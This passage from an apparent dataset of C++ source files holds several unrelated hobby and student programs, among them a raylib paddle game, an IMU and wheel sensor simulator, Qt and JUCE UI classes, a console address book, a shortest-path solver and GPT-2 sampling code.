Vector2Angle(ball.velocity, Vector2{ 1, 0 });\n\t\tball.velocity.x = -cos(ball.angle);\n\t\tball.velocity.y = -sin(ball.angle);\n\t}\n\telse if (ball.position.y + (ball.radius / 2) >= screenHeight ||\n\t\t\t ball.position.y - (ball.radius / 2) <= 0)\n\t{\n\t\tball.angle = Vector2Angle(ball.velocity, Vector2{ 0, 1 });\n\t\tball.velocity.x = cos(ball.angle);\n\t\tball.velocity.y = -sin(ball.angle);\n\t}\n}\n\nvoid DrawPaddle(Color color)\n{\n\tDrawRectangle(paddle.position.x, paddle.position.y, paddle.width, paddle.height, color);\n}\n\n",
    "//\n// Created by hyj on 17-6-22.\n//\n\n#include <fstream>\n#include <queue>\n#include <sys/stat.h>\n#include \"../src/imu.h\"\n#include \"../src/utilities.h\"\n#include \"camodocal/camera_models/CameraFactory.h\"\n\nusing Point = Eigen::Vector4d;\nusing Points = std::vector<Point, Eigen::aligned_allocator<Point> >;\nusing Line = std::pair<Eigen::Vector4d, Eigen::Vector4d>;\nusing Lines = std::vector<Line, Eigen::aligned_allocator<Line> >;\n\nstd::string config_file = \"../config/sim_config.yaml\";\nParam params;\n\nvoid CreatePointsLines(Points& points, Lines& lines)\n{\n    std::ifstream f;\n    f.open(\"house_model/house.txt\");\n\n    while(!f.eof())\n    {\n        std::string s;\n        std::getline(f,s);\n        if(!s.empty())\n        {\n            std::stringstream ss;\n            ss << s;\n            double x,y,z;\n            ss >> x;\n            ss >> y;\n            ss >> z;\n            Eigen::Vector4d pt0( x, y, z, 1 );\n            ss >> x;\n            ss >> y;\n            ss >> z;\n            Eigen::Vector4d pt1( x, y, z, 1 );\n\n            bool isHistoryPoint = false;\n            for (int i = 0; i < points.size(); ++i) {\n                Eigen::Vector4d pt = points[i];\n                if(pt == pt0)\n                {\n                    isHistoryPoint = true;\n                }\n            }\n            if(!isHistoryPoint)\n                points.push_back(pt0);\n\n            isHistoryPoint = false;\n            for (int i = 0; i < points.size(); ++i) {\n                Eigen::Vector4d pt = points[i];\n                if(pt == pt1)\n                {\n                    isHistoryPoint = true;\n                }\n            }\n            if(!isHistoryPoint)\n                points.push_back(pt1);\n\n            // pt0 = Twl * pt0;\n            // pt1 = Twl * pt1;\n            lines.emplace_back(pt0, pt1);   // lines\n        }\n    }\n\n    // create more 3d points, you can comment this code\n    int n = points.size();\n    for (int j = 0; j < n; ++j) {\n        Eigen::Vector4d p = points[j] + Eigen::Vector4d(0.5,0.5,-0.5,0);\n        points.push_back(p);\n    }\n\n    // save points\n    save_points(\"all_points.txt\", points);\n}\nvoid addCamNoise(Eigen::Vector2d &obs){\n    std::random_device rd;\n    std::default_random_engine generator_(rd());\n    std::normal_distribution<double> noise(0.0, 1.0);\n    Eigen::Vector2d noise_pixel(noise(generator_),noise(generator_));\n    obs += params.pixel_noise * noise_pixel;\n}\n\nint main(){\n\n    // Eigen::Quaterniond Qwb;\n    // Qwb.setIdentity();\n    // Eigen::Vector3d omega (0,0,M_PI/10);\n    // double dt_tmp = 0.005;\n    // for (double i = 0; i < 20.; i += dt_tmp) {\n    //     Eigen::Quaterniond dq;\n    //     Eigen::Vector3d dtheta_half =  omega * dt_tmp /2.0;\n    //     dq.w() = 1;\n    //     dq.x() = dtheta_half.x();\n    //     dq.y() = dtheta_half.y();\n    //     dq.z() = dtheta_half.z();\n    //     Qwb = Qwb * dq;\n    // }\n    // std::cout << Qwb.coeffs().transpose() <<\"\\n\"<<Qwb.toRotationMatrix() << std::endl;\n\n    // \u5efa\u7acbkeyframe\u6587\u4ef6\u5939\n    mkdir(\"keyframe\", 0777);\n\n    // \u751f\u62103d points\n    Points points;\n    Lines lines;\n    CreatePointsLines(points, lines);\n\n    // IMU model\n    params.readParameters(config_file);\n    IMU imuGen(params);\n    camodocal::CameraPtr m_camera = camodocal::CameraFactory::instance()->generateCameraFromYamlFile(config_file);\n    // create imu data\n    // imu pose gyro acc\n    std::vector< MotionData > imudata;\n    std::vector< MotionData > imudata_noise;\n    for (float t = params.t_start; t<params.t_end;) {\n        MotionData data = imuGen.MotionModel(t);\n        imudata.push_back(data);\n\n        // add imu noise\n        MotionData data_noise = data;\n        imuGen.addIMUnoise(data_noise);\n        imudata_noise.push_back(data_noise);\n\n        t += 1.0/params.imu_frequency;\n    }\n    imuGen.init_velocity_ = imudata[0].imu_velocity;\n    imuGen.init_twb_ = imudata.at(0).twb;\n    imuGen.init_Rwb_ = imudata.at(0).Rwb;\n    save_Pose(\"imu_pose.txt\", imudata);\n    save_Pose(\"imu_pose_noise.txt\", imudata_noise);\n\n    imuGen.testImu(\"imu_pose.txt\", \"imu_int_pose.txt\");     // test the imu data, integrate the imu data to generate the imu trajecotry\n    imuGen.testImu(\"imu_pose_noise.txt\", \"imu_int_pose_noise.txt\");\n    imuGen.testImuMidPoint(\"imu_pose_noise.txt\", \"imu_int_pose_noise_midpoint.txt\");\n    imuGen.testImuMidPoint(\"imu_pose.txt\", \"imu_int_pose_midpoint.txt\");\n\n    // wheel pose\n    Wheel wheelGen(params);\n    std::vector< WheelMotionData > wheeldata;\n    std::vector< WheelMotionData > wheeldata_noise;\n\n    for (float t = params.t_start; t<params.t_end;) {\n        WheelMotionData data = wheelGen.MotionModel(t);\n        data.timestamp += params.td_wheel;\n        wheeldata.push_back(data);\n        // add wheel noise\n        WheelMotionData data_noise = data;\n        wheelGen.addWheelnoise(data_noise);\n        wheeldata_noise.push_back(data_noise);\n        t += 1.0/params.wheel_frequency;\n    }\n    wheelGen.init_velocity_ = wheeldata[0].wheel_velocity;\n    wheelGen.init_two_ = wheeldata.at(0).two;\n ",
    "#include \"student_coursetable.h\"\n#include <QDebug>\n\n\nint student_courseTable::SQLCount()\n{\n    QSqlQuery query(courseTable_db);\n    int count=0;\n    query.exec(\"select* from courseTable\");\n    while(query.next() && ++count);\n    query.finish();\n    return count;\n}\n\nvoid student_courseTable::derive_SQL_to_model()\n{\n//\u6e05\u9664\u5355\u5143\u683c\n    for(int i=0;i<VFieldName.size();i++){\n        for(int j=0;j<HFieldName.size();j++){\n            standardModel->clearItemData(standardModel->index(i,j));\n        }\n    }\n    QSqlQuery query(courseTable_db);\n    query.exec(\"select* from courseTable\");\n    if(query.next() == false){\n        QMessageBox::information(this,\"\u63d0\u793a\",\"\u6570\u636e\u5e93\u4e3a\u7a7a\uff0c\u6682\u65f6\u65e0\u6cd5\u5bfc\u5165\u5230model\",QMessageBox::Yes | QMessageBox::No,QMessageBox::Yes);\n        return;\n    }\n//\u5bfc\u5165\u6570\u636e\u5e93\u4fe1\u606f\u5230model\n    for(int i=0;i<SQLCount();i++,query.next()){\n        for(int j=0;j<HFieldName.size();j++){\n            standardModel->setItem(i,j,new QStandardItem(query.value(j).toString().replace(\"\\\\n\",\"\\n\")));\n        }\n    }\n    QMessageBox::information(this,\"\u63d0\u793a\",\"\u6570\u636e\u5bfc\u5165\u6210\u529f\",QMessageBox::Yes | QMessageBox::No,QMessageBox::Yes);\n    query.finish();\n}\n\nvoid student_courseTable::derive_model_to_SQL()\n{\n    QMessageBox::information(this,\"\u63d0\u793a\",\"\u5b66\u751f\u65e0\u6cd5\u4fee\u6539\u8bfe\u7a0b\u8868\",QMessageBox::Yes|QMessageBox::No,QMessageBox::Yes);\n//\u60f3\u5bfc\u5165\u5c31\u53d6\u6d88\u4e0b\u9762\u7684\u6ce8\u91ca\n    /*if(standardModel->rowCount()<=0){\n        QMessageBox::information(this,\"\u63d0\u793a\",\"\u8868\u683c\u4e3a\u7a7a\uff0c\u65e0\u6cd5\u5bfc\u51fa\",QMessageBox::Yes | QMessageBox::No,QMessageBox::Yes);\n        return;\n    }\n    QSqlQuery query(courseTable_db);\n    query.exec(\"delete from courseTable\");\n    for(int i=0;i<standardModel->rowCount();i++){\n        query.exec(QString(\"insert into courseTable(monday,tuesday,wednesday,thursday,friday,saturday,sunday) values('%1','%2','%3','%4','%5','%6','%7')\").arg(standardModel->data(QModelIndex(standardModel->index(i,0))).toString()).arg(standardModel->data(QModelIndex(standardModel->index(i,1))).toString()).arg(standardModel->data(QModelIndex(standardModel->index(i,2))).toString()).arg(standardModel->data(QModelIndex(standardModel->index(i,3))).toString()).arg(standardModel->data(QModelIndex(standardModel->index(i,4))).toString()).arg(standardModel->data(QModelIndex(standardModel->index(i,5))).toString()).arg(standardModel->data(QModelIndex(standardModel->index(i,6))).toString()));\n    }\n    QMessageBox::information(this,\"\u63d0\u793a\",\"model\u6210\u529f\u5bfc\u51fa\u6570\u636e\u5e93\",QMessageBox::Yes | QMessageBox::No,QMessageBox::Yes);\n    query.finish();\n    */\n}\n\n\n\nstudent_courseTable::student_courseTable(courseTable *parent)\n    : courseTable{parent}\n{\n    courseTable::iniStandardView(HFieldName,VFieldName);\n    courseTable::createSQL(courseTable_db,\"three\",\"courseTable\");\n    courseTable::signal_on_model();\n}\n\nstudent_courseTable::~student_courseTable()\n{\n    qDebug()<<\"\u6790\u6784\u5b66\u751f\u8bfe\u7a0b\u8868student_courseTable\";\n}\n",
    "#include \"PlayerController.h\"\n\n//==============================================================================\n// PlayerController\n//==============================================================================\nPlayerController::PlayerController(juce::ValueTree& appState)\n    : applicationState(appState)\n{\n    groupPlayerController = std::make_unique<juce::GroupComponent>();\n    groupPlayerController->setText(\"Player Controller\");\n    groupPlayerController->setTextLabelPosition(juce::Justification::centred);\n    addAndMakeVisible(groupPlayerController.get());\n\n    playButton = std::make_unique<juce::TextButton>();\n    playButton->setButtonText(\"Play\");\n    playButton->setColour(juce::TextButton::ColourIds::buttonOnColourId, juce::Colour(0xFF2F9E44));\n    playButton->onClick =\n        [safe_this = juce::Component::SafePointer(this)]() {\n        if (safe_this.getComponent() == nullptr)\n        {\n            return;\n        }\n\n        safe_this->valueIsPlaying = !safe_this->valueIsPlaying.get();\n        };\n    addAndMakeVisible(playButton.get());\n\n    loopButton = std::make_unique<juce::TextButton>();\n    loopButton->setButtonText(\"Loop\");\n    loopButton->setColour(juce::TextButton::ColourIds::buttonOnColourId, juce::Colour(0xFFFF7733));\n    loopButton->onClick =\n        [safe_this = juce::Component::SafePointer(this)]() {\n        if (safe_this.getComponent() == nullptr)\n        {\n            return;\n        }\n\n        safe_this->valueIsLooping = !safe_this->valueIsLooping.get();\n        };\n    addAndMakeVisible(loopButton.get());\n\n    syncToHostButton = std::make_unique<juce::ToggleButton>();\n    syncToHostButton->setButtonText(\"Sync To Host\");\n    syncToHostButton->onClick =\n        [safe_this = juce::Component::SafePointer(this)]() {\n        if (safe_this.getComponent() == nullptr)\n        {\n            return;\n        }\n\n        safe_this->valueIsSyncToHost = !safe_this->valueIsSyncToHost.get();\n        };\n    addAndMakeVisible(syncToHostButton.get());\n\n    applicationState.addListener(this);\n\n    valueCanPlay.referTo(applicationState, \"Player_CanPlay\", nullptr);\n    valueCanPlay.forceUpdateOfCachedValue();\n\n    valueIsPlaying.referTo(applicationState, \"Player_IsPlaying\", nullptr);\n    valueIsPlaying.forceUpdateOfCachedValue();\n\n    valueIsLooping.referTo(applicationState, \"Player_IsLooping\", nullptr);\n    valueIsLooping.forceUpdateOfCachedValue();\n\n    valueIsSyncToHost.referTo(applicationState, \"Player_IsSyncToHostTransport\", nullptr);\n    valueIsSyncToHost.forceUpdateOfCachedValue();\n\n    // Initial update\n    updateView();\n}\n\nPlayerController::~PlayerController()\n{\n    applicationState.removeListener(this);\n}\n\n//==============================================================================\nvoid PlayerController::paint (juce::Graphics& g)\n{\n    juce::ignoreUnused(g);\n}\n\nvoid PlayerController::resized()\n{\n    auto area = getLocalBounds();\n\n    groupPlayerController->setBounds(area.reduced(8));\n\n    {\n        auto rect_player_controller = groupPlayerController->getBounds().withTrimmedTop(8).reduced(8);\n        const auto width = rect_player_controller.getWidth();\n        const auto height = rect_player_controller.getHeight() / 3;\n        const auto width_button = width;\n        const auto height_button = height;\n        playButton->setBounds(rect_player_controller.removeFromTop(height).withSizeKeepingCentre(width_button, height_button).reduced(8));\n        loopButton->setBounds(rect_player_controller.removeFromTop(height).withSizeKeepingCentre(width_button, height_button).reduced(8));\n        syncToHostButton->setBounds(rect_player_controller.removeFromTop(height).withSizeKeepingCentre(width_button, height_button).reduced(8));\n    }\n}\n\n//==============================================================================\nvoid PlayerController::valueTreePropertyChanged(juce::ValueTree& treeWhosePropertyHasChanged, const juce::Identifier& propertyId)\n{\n    if (treeWhosePropertyHasChanged == applicationState)\n    {\n        if (propertyId.toString() == \"Player_CanPlay\")\n        {\n            valueCanPlay.forceUpdateOfCachedValue();\n            playButton->setEnabled(valueCanPlay.get());\n        }\n        else if (propertyId.toString() == \"Player_IsPlaying\")\n        {\n            valueIsPlaying.forceUpdateOfCachedValue();\n            playButton->setToggleState(valueIsPlaying.get(), juce::dontSendNotification);\n        }\n        else if (propertyId.toString() == \"Player_IsLooping\")\n        {\n            valueIsLooping.forceUpdateOfCachedValue();\n            loopButton->setToggleState(valueIsLooping.get(), juce::dontSendNotification);\n        }\n        else if (propertyId.toString() == \"Player_IsSyncToHostTransport\")\n        {\n            valueIsSyncToHost.forceUpdateOfCachedValue();\n            syncToHostButton->setToggleState(valueIsSyncToHost.get(), juce::dontSendNotification);\n        }\n\n        updateView();\n    }\n}\n\n//==============================================================================\nvoid PlayerCon",
    "#include <iostream>\r\nusing namespace std;\r\n#define max 1000\r\n\r\n//\u8bbe\u8ba1\u8054\u7cfb\u4eba\u7ed3\u6784\u4f53\r\nstruct person\r\n{\r\n\tstring m_name;\r\n\tint m_sex;//\u6027\u522b\r\n\tint m_age;\r\n\tstring m_phone;\r\n\tstring m_addr;\r\n};\r\n//\u8bbe\u8ba1\u901a\u8baf\u5f55\u7ed3\u6784\u4f53\r\nstruct addressbooks\r\n{\r\n\t//\u4fdd\u5b58\u8054\u7cfb\u4eba\u6570\u7ec4\r\n\tstruct person personarray[max];\r\n\t//\u901a\u8baf\u5f55\u4e2d\u5f53\u524d\u8bb0\u5f55\u4eba\u4e2a\u6570\r\n\tint m_size;\r\n};\r\n//\u83dc\u5355\u754c\u9762\r\nvoid showmenu()\r\n{\r\n\tcout << \"**************************\" << endl;\r\n\tcout << \"*****  1.\u6dfb\u52a0\u8054\u7cfb\u4eba  *****\" << endl;\r\n\tcout << \"*****  2.\u663e\u793a\u8054\u7cfb\u4eba  *****\" << endl;\r\n\tcout << \"*****  3.\u5220\u9664\u8054\u7cfb\u4eba  *****\" << endl;\r\n\tcout << \"*****  4.\u67e5\u627e\u8054\u7cfb\u4eba  *****\" << endl;\r\n\tcout << \"*****  5.\u4fee\u6539\u8054\u7cfb\u4eba  *****\" << endl;\r\n\tcout << \"*****  6.\u6e05\u7a7a\u8054\u7cfb\u4eba  *****\" << endl;\r\n\tcout << \"*****  0.\u9000\u51fa\u901a\u8baf\u5f55  *****\" << endl;\r\n\tcout << \"**************************\" << endl;\r\n}\r\n//\u6dfb\u52a0\u8054\u7cfb\u4eba\r\nvoid addperson(addressbooks* abs)\r\n{\r\n\t//\u6dfb\u52a0\u5177\u4f53\u8054\u7cfb\u4eba\r\n\tstring name;\r\n\tcout << \"\u8bf7\u8f93\u5165\u59d3\u540d:  \" << endl;\r\n\tcin >> name;\r\n\tabs->personarray[abs->m_size].m_name = name;\r\n\tcout << \"\u8bf7\u8f93\u5165\u6027\u522b\" << endl;    //\u6dfb\u52a0\u6027\u522b\r\n\tcout << \"1----\u7537\" <<  endl;\r\n\tcout << \"2----\u5973\" << endl;\r\n\tint sex = 0;\r\n\twhile (true)\r\n\t{\r\n\t\tcin >> sex;\r\n\t\tif (sex == 1 || sex == 2)\r\n\t\t{\r\n\t\t\tabs->personarray[abs->m_size].m_sex = sex;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcout << \"\u8f93\u5165\u6709\u8bef\uff0c\u91cd\u65b0\u8f93\u5165\" << endl;\r\n\t}\r\n\t//\u5e74\u9f84\r\n\tcout << \"\u8bf7\u8f93\u5165\u5e74\u9f84\" << endl;\r\n\tint age = 0;\r\n\tcin >> age;\r\n\tabs->personarray[abs->m_size].m_age = age;\r\n\t//\u7535\u8bdd\r\n\tcout << \"\u8bf7\u8f93\u5165\u7535\u8bdd\" << endl;\r\n\tstring phone;\r\n\tcin >> phone;\r\n\tabs->personarray[abs->m_size].m_phone = phone;\r\n\t//\u4f4f\u5740\r\n\tcout << \"\u8bf7\u8f93\u5165\u5bb6\u5ead\u4f4f\u5740\" << endl;\r\n\tstring address;\r\n\tcin >> address;\r\n\tabs->personarray[abs->m_size].m_addr = address;\r\n\t//\u66f4\u65b0\u901a\u8baf\u5f55\u4eba\u6570\r\n\tabs->m_size++;\r\n\r\n\tcout << \"\u6dfb\u52a0\u6210\u529f\" << endl;\r\n\r\n\tsystem(\"pause\");//\u8bf7\u6309\u4efb\u610f\u952e\u7ee7\u7eed\r\n\tsystem(\"cls\");//\u6e05\u5c4f\r\n}\r\n//\u663e\u793a\u6240\u6709\u8054\u7cfb\u4eba\r\nvoid showperson(addressbooks* abs)\r\n{\r\n\tif (abs->m_size == 0)\r\n\t{\r\n\t\tcout << \"\u5f53\u524d\u8bb0\u5f55\u4e3a\u7a7a\" << endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tfor (int i = 0; i < abs->m_size; i++)\r\n\t\t{\r\n\t\t\tcout << \"\u59d3\u540d\" << abs->personarray[i].m_name << \"\\t\";\r\n\t\t\tcout << \"\u6027\u522b\" << (abs->personarray[i].m_sex == 1 ? \"\u7537\" : \"\u5973\") << \"\\t\";\r\n\t\t\tcout << \"\u5e74\u9f84\" << abs->personarray[i].m_age << \"\\t\";\r\n\t\t\tcout << \"\u7535\u8bdd\" << abs->personarray[i].m_phone << \"\\t\";\r\n\t\t\tcout << \"\u4f4f\u5740\" << abs->personarray[i].m_addr << endl;\r\n\t\t}\r\n\t}\r\n\tsystem(\"pause\");//\u6309\u4efb\u610f\u952e\u7ee7\u7eed\r\n\tsystem(\"cls\");//\u6e05\u5c4f\r\n}\r\n//\u68c0\u67e5\u8054\u7cfb\u4eba\u662f\u5426\u5b58\u5728\r\nint isexist(addressbooks* abs, string name)\r\n{\r\n\tfor (int i = 0; i < abs->m_size; i++)\r\n\t{\r\n\t\tif (abs->personarray[i].m_name == name)\r\n\t\t{\r\n\t\t\treturn i;//\u627e\u5230\u4e86,\u8fd4\u56de\u8fd9\u4e2a\u4eba\r\n\t\t}\r\n\t}\r\n\treturn -1;\r\n}\r\n//3.\u5220\u9664\u6307\u5b9a\u8054\u7cfb\u4eba\r\nvoid deleteperson(addressbooks* abs)\r\n{\r\n\tcout << \"\u8bf7\u8f93\u5165\u4f60\u8981\u5220\u9664\u7684\u8054\u7cfb\u4eba\" << endl;\r\n\tstring name;\r\n\tcin >> name;\r\n\t//ret ==-1;\u672a\u67e5\u5230\r\n\t//ret!=-1;\u67e5\u5230\u4e86\r\n\tint ret = isexist(abs, name);\r\n\tif (ret != -1)\r\n\t{\r\n\t\t//\u67e5\u627e\u5230\u4eba\uff0c\u8981\u8fdb\u884c\u5220\u9664\u64cd\u4f5c\r\n\t\tfor (int i = ret; i < abs->m_size;i++)\r\n\t\t{\r\n\t\t\t//\u6570\u636e\u524d\u79fb\r\n\t\t\tabs->personarray[i] = abs->personarray[i + 1];\r\n\t\t}\r\n\t\tabs->m_size--;//\u66f4\u65b0\u901a\u8baf\u5f55\u4eba\u5458\u6570\r\n\t\tcout << \"\u5220\u9664\u6210\u529f\" << endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout << \"\u67e5\u65e0\u6b64\u4eba\" << endl;\r\n\t}\r\n\tsystem(\"pause\");//\u6309\u4efb\u610f\u952e\u7ee7\u7eed\r\n\tsystem(\"cls\");//\u6e05\u5c4f\r\n\r\n}\r\nvoid findperson(addressbooks* abs)\r\n{\r\n\tcout << \"\u8bf7\u8f93\u5165\u4f60\u8981\u67e5\u627e\u7684\u8054\u7cfb\u4eba\" << endl;\r\n\tstring name;\r\n\tcin >> name;\r\n\r\n\t//\u5224\u65ad\u6307\u5b9a\u7684\u8054\u7cfb\u4eba\u662f\u5426\u5b58\u5728\u4e8e\u901a\u8baf\u5f55\r\n\tint ret = isexist(abs, name);\r\n\tif (ret != -1)//\u627e\u5230\r\n\t{\r\n\t\tcout << \"\u59d3\u540d\" << abs->personarray[ret].m_name << \"\\t\";\r\n\t\tcout << \"\u6027\u522b\" << (abs->personarray[ret].m_sex == 1 ? \"\u7537\" : \"\u5973\") << \"\\t\";\r\n\t\tcout << \"\u5e74\u9f84\" << abs->personarray[ret].m_age << \"\\t\";\r\n\t\tcout << \"\u7535\u8bdd\" << abs->personarray[ret].m_phone << \"\\t\";\r\n\t\tcout << \"\u4f4f\u5740\" << abs->personarray[ret].m_addr << endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout << \"\u672a\u627e\u5230\u8054\u7cfb\u4eba\" << endl;\r\n\t}\r\n\tsystem(\"pause\");\r\n\tsystem(\"cls\");\r\n}\r\n//5.\u4fee\u6539\u8054\u7cfb\u4eba\r\nvoid modifyperson(addressbooks* abs)\r\n{\r\n\tcout << \"\u8bf7\u8f93\u5165\u4f60\u8981\u4fee\u6539\u7684\u8054\u7cfb\u4eba\" << endl;\r\n\tstring name;\r\n\tcin >> name;\r\n\tint ret = isexist(abs, name);\r\n\tif (ret != -1)//\u627e\u5230\r\n\t{\r\n\t\t//\u59d3\u540d\r\n\t\tstring name;\r\n\t\tcout << \"\u8bf7\u8f93\u5165\u59d3\u540d\" << endl;\r\n\t\tcin >> name;\r\n\t\tabs->personarray[ret].m_name = name;\r\n\t\t//\u6027\u522b\r\n\t\tcout << \"\u8bf7\u8f93\u5165\u6027\u522b\" << endl;\r\n\t\tcout << \"1----\u7537\" << endl;\r\n\t\tcout << \"2---\u5973\" << endl;\r\n\t\tint sex = 0;\r\n\t\twhile (true)\r\n\t\t{\r\n\t\t\tcin >> sex;\r\n\t\t\tif (sex == 1 || sex == 2)\r\n\t\t\t{\r\n\t\t\t\tabs->personarray[ret].m_sex = sex;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tcout << \"\u8f93\u5165\u9519\u8bef\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\" << endl;\r\n\t\t}\r\n\t\t//\u5e74\u9f84\r\n\t\tcout << \"\u8bf7\u8f93\u5165\u5e74\u9f84\" << endl;\r\n\t\tint age = 0;\r\n\t\tcin >> age;\r\n\t\tabs->personarray[ret].m_age = age;\r\n\t\t//\u7535\u8bdd\r\n\t\tcout << \"\u8bf7\u8f93\u5165\u8054\u7cfb\u7535\u8bdd\" << endl;\r\n\t\tstring phone;\r\n\t\tcin >> phone;\r\n\t\tabs->personarray[ret].m_phone = phone;\r\n\t\t//\u5bb6\u5ead\u4f4f\u5740\r\n\t\tcout << \"\u8bf7\u8f93\u5165\u5bb6\u5ead\u4f4f\u5740\" << endl;\r\n\t\tstring address;\r\n\t\tcin >> address;\r\n\t\tabs->personarray[ret].m_addr = address;\r\n\r\n\t\tcout << \"\u4fee\u6539\u6210\u529f\" << endl;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout << \"\u67e5\u65e0\u6b64\u4eba\" << endl;\r\n\t}\r\n\tsystem(\"pause\");\r\n\tsystem(\"cls\");\r\n}\r\nvoid cleanperson(addressbooks* abs)\r\n{\r\n\tabs->m_size = 0;\r\n\tcout << \"\u901a\u8baf\u5f55\u5df2\u6e05\u7a7a\" << endl;\r\n\tsystem(\"pause\");\r\n\tsystem(\"cls\");\r\n}\r\nint main()\r\n{\r\n\t//\u521b\u5efa\u901a\u8baf\u5f55\u7ed3\u6784\u4f53\u53d8\u91cf\r\n\taddressbooks abs;\r\n\t//\u521d\u59cb\u5316\u901a\u8baf\u5f55\u5f53\u524d\u4eba\u5458\u4e2a\u6570\r\n\tabs.m_size = 0;\r\n\tint select = 0;\r\n\twhile (true)\r\n\t{\r\n\t\t//\u83dc\u5355\u8c03\u7528\r\n\t\tshowmenu();\r\n\r\n\t\tcin >> select;\r\n\r\n\t\tswitch (select)\r\n\t\t{\r\n\t\tcase 1://\u6dfb\u52a0\u8054\u7cfb\u4eba\r\n\t\t\taddperson(&abs);//\u5229\u7528\u5730\u5740\u4f20\u9012\u4fee\u9970\u5b9e\u53c2\r\n\t\t\tbreak;\r\n\t\tcase 2:\r\n\t\t\tshowperson(&abs);//\u663e\u793a\u8054\u7cfb\u4eba\r\n\t\t\tbreak;\r\n\t\tcase 3://3.\u5220\u9664\u8054\u7cfb\u4eba\r\n\t\t{\r\n\t\t\tcout << \"\u8bf7\u8f93\u5165\u5220\u9664\u8054\u7cfb\u4eba\u59d3\u540d\" << endl;\r\n\t\tstring name;\r\n\t\tcin >> name;\r\n\t\tif (isexist(&abs, name) == -1)\r\n\t\t{\r\n\t\t\tcout << \"\u67e5\u65e0",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n\nusing namespace std;\n\n// Function to get computer's choice\nstring getComputerChoice() {\n    int randomChoice = rand() % 3;\n    if (randomChoice == 0)\n        return \"rock\";\n    else if (randomChoice == 1)\n        return \"paper\";\n    else\n        return \"scissors\";\n}\n\n// Function to get the winner\nstring getWinner(string playerChoice, string computerChoice) {\n    if (playerChoice == computerChoice)\n        return \"It's a tie!\";\n    else if ((playerChoice == \"rock\" && computerChoice == \"scissors\") ||\n             (playerChoice == \"paper\" && computerChoice == \"rock\") ||\n             (playerChoice == \"scissors\" && computerChoice == \"paper\"))\n        return \"You win!\";\n    else\n        return \"Computer wins!\";\n}\n\nint main() {\n\n\n    string playerChoice;\n    string computerChoice;\n\n    cout << \"Welcome to Rock, Paper, Scissors!\" << endl;\n    cout << \"Enter rock, paper, or scissors: \";\n    cin >> playerChoice;\n\n    computerChoice = getComputerChoice();\n\n    cout << \"Computer chose: \" << computerChoice << endl;\n    cout << getWinner(playerChoice, computerChoice) << endl;\n\n    return 0;\n}\n",
    "#pragma GCC optimize(\"Ofast,unroll-loops,no-stack-protector,fast-math\")\n#pragma GCC target(\"sse,sse2,sse3,ssse3,sse4,popcnt,abm,mmx,avx,tune=native\")\n#include<bits/stdc++.h>\n#include<ext/pb_ds/assoc_container.hpp>\nusing namespace __gnu_pbds;\nusing namespace std;\n#define pb push_back\n#define mp make_pair\n#define F first\n#define S second\n#define pii pair<int, int>\n#define pq priority_queue\n#define q queue\n#define cl clear\n#define elif else if\n#define fast ios::sync_with_stdio(false), cin.tie(0), cout.tie(0)\n#define pll pair<long long, long long>\n#define ll long long\nconst long long INF=2e18;\n/********************************************************/\n/********************************************************/\nint node, edge, s;\nconst int max_node=510;\nll dis[max_node][max_node]; //max_nodes\nll adj[max_node][max_node]; \nvoid make_inf() {\n    for(int i=1;i<max_node;i++) {\n        for(int j=1;j<max_node;j++) {\n            dis[i][j]=INF;\n            adj[i][j]=INF;\n        }\n    }\n}\nvoid build_floyd() {\n    for(int i = 1; i <= node; i++) {\n        for(int j = 1; j <= node; j++) {\n            dis[i][j] = adj[i][j];  //\u521d\u59cb\u5316 \u624d\u53ef\u4ee5DP\n        }\n    }\n    for(int i = 1; i <= node; i++)\n        dis[i][i]=min(dis[i][i], (ll)0);  //\u81ea\u5df1\u5230\u81ea\u5df1=0\n    \n    for(int k = 1; k <= node; k++) {\n        for(int i = 1; i <= node; i++) {\n            for(int j = 1; j <= node; j++) {\n                 dis[i][j] = min(dis[i][j], dis[i][k] + dis[k][j]);  //DP to do floyd\n            }\n        }\n    }\n}\nsigned main() {\n    fast;\n    make_inf();\n    cin>>node>>edge>>s;\n    long long a, b, c;\n    for(int i=0;i<edge;i++) {\n        cin>>a>>b>>c;\n        adj[a][b]=min(adj[a][b], c);\n        adj[b][a]=min(adj[b][a], c); //\u5982\u679c\u662f\u7121\u5411\u5716\uff0c\u9019\u884c\u8981\u4fdd\u7559\uff0c\u5426\u5247\u522a\u9664\n    }\n    build_floyd();\n    for(int i=0;i<s;i++) {\n        cin>>a>>b;\n        if(dis[a][b]==INF) cout<<-1<<'\\n';\n        else cout<<dis[a][b]<<'\\n';\n    }\n    return 0;\n}",
    "#include \"gpt2.h\"\n#include \"utils.h\"\n\nstd::vector<std::vector<uint64_t>> GPT::inference(const std::vector<int64_t>& token_encodings, \n                                                  const int num_return_sequences, \n                                                  const int max_generation_length, \n                                                  const torch::Device& device){\n\n    this->eval(); // turn the model to eval mode.\n\n    // Token shape will be (num_return_sequences, token_encodings.size()) = (B, T)\n    torch::Tensor tokens = torch::tensor(token_encodings, torch::kLong).unsqueeze(0).repeat({num_return_sequences, 1});\n    tokens = tokens.to(device);\n\n    utils::set_seed(42);\n\n    // Generate tokens\n    while(tokens.size(1) < max_generation_length){\n        // Forward pass to get logits\n        torch::Tensor logits;\n        {\n            torch::NoGradGuard no_grad;\n            // B, T, C\n            logits = this->forward(tokens);\n        }\n        \n        // Only interested in the logit at the last position\n        // B, 1, C\n        logits = logits.slice(/*dim=*/1, /*start idx=*/logits.size(1)-1, /*end idx=*/logits.size(1));\n\n        // Get the probabilites of vocabs\n        torch::Tensor probs = torch::softmax(logits, -1);\n        \n        // Perform top-k sampling\n        int k = 50;\n        auto top_k = probs.topk(k, -1);\n        torch::Tensor top_k_probs = std::get<0>(top_k);\n        torch::Tensor top_k_indices = std::get<1>(top_k);\n        // Squeeze the 2nd dimension (B, 1, C) => (B, C)\n        top_k_probs = top_k_probs.squeeze(1);\n        top_k_indices = top_k_indices.squeeze(1);\n\n        // Select a token from the top-k probabilities.\n        // (B, 1), 1 selected from top-k.\n        // Multinomial picks will generate indices of top_k_probs tensors, which are ordered by high -> low probs.\n        // To pick the corresponding vocab index, top_k_indices should be queried with idx key (arranged probs).\n        torch::Tensor idx = torch::multinomial(top_k_probs, /*num samples=*/1, /*replacement=*/true);\n        \n        // Gather the 